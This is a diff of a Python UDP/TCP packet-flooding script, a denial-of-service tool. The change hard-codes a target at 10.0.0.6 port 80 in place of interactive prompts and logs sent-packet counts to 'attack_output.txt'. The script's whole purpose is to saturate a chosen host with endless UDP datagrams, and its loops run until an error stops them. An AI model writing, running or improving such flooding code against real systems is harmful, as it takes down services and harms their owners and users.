@@ -3,12 +3,17 @@
 import random
 import socket
 import threading
+from locale import str
 
-ip = str(input("Host/IP: "))
-port = int(input("Port: "))
-choice = str(input("TCP or UDP?")).upper
-times = int(input("Packets per connection: "))
-threads = int(input("Threads: "))
+
+# ip = str("")
+# port = int(80)/
+
+ip = "10.0.0.6"
+port = 80
+choice = "UDP"
+times = 1
+threads = 1
 
 
 def floodUDP():
@@ -17,12 +22,16 @@ def floodUDP():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            address = (str(ip), int(port))
+            address = (ip, port)
             for x in range(times):
                 s.sendto(data, address)
-            print(i + " packets sent")
+            file_txt = open("attack_output.txt", 'a')
+            file_txt.writelines(i)
+            file_txt.writelines(" packets sent")
+            file_txt.writelines("\n")
         except:
             print("Error")
+            break
 
 
 def floodTCP():
